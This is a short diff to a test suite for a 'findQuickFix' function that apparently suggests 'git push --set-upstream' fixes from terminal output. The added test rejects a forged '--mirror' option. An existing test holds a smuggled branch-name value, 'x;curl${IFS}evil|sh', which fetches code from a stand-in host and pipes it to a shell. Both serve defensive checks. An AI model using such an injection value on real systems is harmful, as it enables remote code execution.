@@ -71,6 +71,11 @@ describe("findQuickFix", () => {
 		expect(reads).toBe(0);
 	});
 
+	it("never offers a git option as the upstream branch", () => {
+		const forged = ["remote: git push --set-upstream origin --mirror", "error: failed to push some refs"].join("\n");
+		expect(findQuickFix([gitPushSetUpstream], input("git push", 1, forged))).toBeNull();
+	});
+
 	it("drops a branch name a program could use to smuggle a second command", () => {
 		const forged = "    git push --set-upstream origin x;curl${IFS}evil|sh";
 		expect(findQuickFix([gitPushSetUpstream], input("git push", 1, forged))).toBeNull();
